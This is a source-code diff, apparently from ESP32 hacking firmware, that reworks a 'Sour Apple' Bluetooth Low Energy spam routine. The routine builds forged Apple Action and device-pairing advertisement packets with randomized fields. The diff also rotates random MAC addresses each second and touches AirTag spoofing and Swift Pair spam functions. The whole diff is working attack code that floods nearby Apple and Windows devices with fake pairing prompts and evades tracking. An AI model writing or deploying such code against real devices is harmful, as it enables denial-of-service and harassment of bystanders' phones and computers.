@@ -72,31 +72,71 @@ extern "C" {
         #endif
         break;
       }
-      case Apple: {
-        AdvData_Raw = new uint8_t[17];
+      case Apple: { // Actions
+        if (random(10) > 0) {
+          AdvData_Raw = new uint8_t[11];
 
-        AdvData_Raw[i++] = 17 - 1;    // Packet Length
-        AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
-        AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
-        AdvData_Raw[i++] = 0x00;        // ...
-        AdvData_Raw[i++] = 0x0F;  // Type
-        AdvData_Raw[i++] = 0x05;                        // Length
-        AdvData_Raw[i++] = 0xC1;                        // Action Flags
-        const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-        AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
-        esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
-        i += 3;   
-        AdvData_Raw[i++] = 0x00;  // ???
-        AdvData_Raw[i++] = 0x00;  // ???
-        AdvData_Raw[i++] =  0x10;  // Type ???
-        esp_fill_random(&AdvData_Raw[i], 3);
+          AdvData_Raw[i++] = 0x0A;    // Packet Length
+          AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+          AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+          AdvData_Raw[i++] = 0x00;        // ...
+          AdvData_Raw[i++] = 0x0F;  // Type
+          AdvData_Raw[i++] = 0x05;                        // Length
+          AdvData_Raw[i++] = 0xC0;                        // Action Flags
 
-        #ifndef HAS_DUAL_BAND
-          AdvData.addData(std::string((char *)AdvData_Raw, 17));
-        #else
-          AdvData.addData(AdvData_Raw, 17);
-        #endif
-        break;
+          const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20};
+          AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
+
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          //i += 3;   
+          //AdvData_Raw[i++] = 0x00;  // ???
+          //AdvData_Raw[i++] = 0x00;  // ???
+          //AdvData_Raw[i++] =  0x10;  // Type ???
+          //esp_fill_random(&AdvData_Raw[i], 3);
+
+          #ifndef HAS_DUAL_BAND
+            AdvData.addData(std::string((char *)AdvData_Raw, 11));
+          #else
+            AdvData.addData(AdvData_Raw, 11);
+          #endif
+          break;
+        }
+        else { // Devices
+          AdvData_Raw = new uint8_t[21];
+          AdvData_Raw[i++] = 0x14;
+          AdvData_Raw[i++] = 0xFF;
+          AdvData_Raw[i++] = 0x4C;
+          AdvData_Raw[i++] = 0x00;
+          AdvData_Raw[i++] = 0x07;
+          AdvData_Raw[i++] = 0x0F;
+          AdvData_Raw[i++] = 0x00;
+          const uint16_t types[] = {0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055, 0x0C20, 0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620};
+          uint16_t type = types[rand() % (sizeof(types) / sizeof(types[0]))];
+          AdvData_Raw[i++] = (uint8_t)((type >> 0x08) & 0xFF);
+          AdvData_Raw[i++] = (uint8_t)((type >> 0x00) & 0xFF);
+
+          AdvData_Raw[i++] = 0xAC;
+          AdvData_Raw[i++] = 0x90;
+          AdvData_Raw[i++] = 0x85;
+          AdvData_Raw[i++] = 0x75;
+          AdvData_Raw[i++] = 0x94;
+          AdvData_Raw[i++] = 0x65;
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = (uint8_t)random(256);
+          AdvData_Raw[i++] = 0x00;
+
+          #ifndef HAS_DUAL_BAND
+            AdvData.addData(std::string((char *)AdvData_Raw, 21));
+          #else
+            AdvData.addData(AdvData_Raw, 21);
+          #endif
+          break;
+        }
       }
       case Samsung: {
 
@@ -4602,25 +4642,44 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
 }
 
 void WiFiScan::executeSourApple() {
+  uint32_t now_time = millis();
   #ifdef HAS_BT
-    NimBLEDevice::init("");
-    NimBLEServer *pServer = NimBLEDevice::createServer();
+    if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0) || (!this->ble_initialized)) {
+      uint8_t macAddr[6];
+      generateRandomMac(macAddr);
+      this->setBaseMacAddress(macAddr);
 
-    pAdvertising = pServer->getAdvertising();
+      NimBLEDevice::init("");
+      NimBLEServer *pServer = NimBLEDevice::createServer();
 
-    delay(40);
-    //NimBLEAdvertisementData advertisementData = getOAdvertisementData();
-    NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
-    pAdvertising->setAdvertisementData(advertisementData);
+      pAdvertising = pServer->getAdvertising();
+
+      delay(40);
+
+      NimBLEAdvertisementData advertisementData = this->GetUniversalAdvertisementData(Apple);
+      pAdvertising->setAdvertisementData(advertisementData);
+
+      this->ble_initialized = true;
+    }
+
     pAdvertising->start();
-    delay(20);
+    delay(60);
     pAdvertising->stop();
+
+    #ifndef HAS_DUAL_BAND
+      if ((now_time - this->last_sour_apple_update > 1000) || (this->last_sour_apple_update == 0)) {
+        this->last_sour_apple_update = now_time;
+        NimBLEDevice::deinit();
+        this->ble_initialized = false;
+      }
+    #endif
+
   #endif
 }
 
 void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
   // Use ESP-IDF function to set the base MAC address
-  #ifndef HAS_DUAL_BAND
+  //#ifndef HAS_DUAL_BAND
     esp_err_t err = esp_base_mac_addr_set(macAddr);
 
     // Check for success or handle errors
@@ -4631,7 +4690,7 @@ void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
     } else {
       Serial.printf("Error: Failed to set MAC address. Code: %d\n", err);
     }
-  #endif
+  //#endif
 }
 
 void WiFiScan::executeSpoofAirtag() {
@@ -4662,7 +4721,9 @@ void WiFiScan::executeSpoofAirtag() {
         delay(10);
         pAdvertising->stop();
 
-        NimBLEDevice::deinit();
+        #ifndef HAS_DUAL_BAND
+          NimBLEDevice::deinit();
+        #endif
 
         break;
       }
@@ -4692,7 +4753,9 @@ void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
     delay(10);
     pAdvertising->stop();
 
-    NimBLEDevice::deinit();
+    #ifndef HAS_DUAL_BAND
+      NimBLEDevice::deinit();
+    #endif
   #endif
 }
 
@@ -5228,10 +5291,10 @@ void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
 
 void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
   #ifdef HAS_BT
-    /*NimBLEDevice::init("");
+    NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
 
-    pAdvertising = pServer->getAdvertising();*/
+    pAdvertising = pServer->getAdvertising();
 
     #ifdef HAS_SCREEN
       display_obj.TOP_FIXED_AREA_2 = 48;
